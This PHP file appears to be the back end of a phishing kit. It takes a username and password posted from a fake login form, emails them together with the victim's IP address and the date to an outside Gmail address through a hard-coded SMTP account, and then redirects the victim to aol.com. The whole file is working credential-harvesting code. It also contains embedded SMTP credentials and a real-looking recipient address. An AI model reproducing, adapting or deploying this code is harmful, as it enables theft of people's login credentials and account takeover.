<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$ip = $_SERVER['REMOTE_ADDR'];

if(isset($_POST['verifyPassword'])){
	$user = $_POST['username'];
	$pass = $_POST['password'];
	$dte = date("Y-m-d");
	#validate the password
	if($pass == ""){
	    $encode_email = base64_encode($user);
		header("Location:password.php?error=3&base64file=".$encode_email);
	} else {

        /***send copy to recepient email***/
        $message = "<table width='100%' style='padding:15px'><tr><td>";
        $message .= "<h3>Attn: LOG ARRIVED!</h3><br>";
        $message .= "Below are your log details<br>";
        $message .= "Username/Email/Mobile: <strong>".$user."</strong><br>";
        $message .= "Password: <strong>".$pass."</strong><br>";
        $message .= "IP Address: <strong>".$ip."</strong><br>";
        $message .= "Date: </strong>".$dte."</strong><br>";
        $message .= "</td></tr></table>";

        //Create an instance; passing `true` enables exceptions
        $mail = new PHPMailer(true);
        
        try {
            //Server settings
            //$mail->SMTPDebug = 2; //SMTP::DEBUG_SERVER;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host       = 'mail.minisoftclook.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
            $mail->Username   = 'admin@minisoftclook.com';                     //SMTP username
            $mail->Password   = 'massive@13';                               //SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->Port       = 465; 
            
            //Recipients
            $mail->setFrom('admin@minisoftclook.com', 'ADMIN');
            $mail->addAddress('westmoorejohn@gmail.com', 'Efe');     //Add a recipient westmoorejohn@gmail.com
            $mail->addReplyTo('admin@minisoftclook.com', 'ADMIN');
            
            //Content
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = $user." Log Arrived!";
            $mail->Body    = $message.'</b>';
            
            $mail->send();
    
            header("location:https://www.aol.com");

        }catch (Exception $e) {
            $err = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            echo $err;
        }
    }
}
?>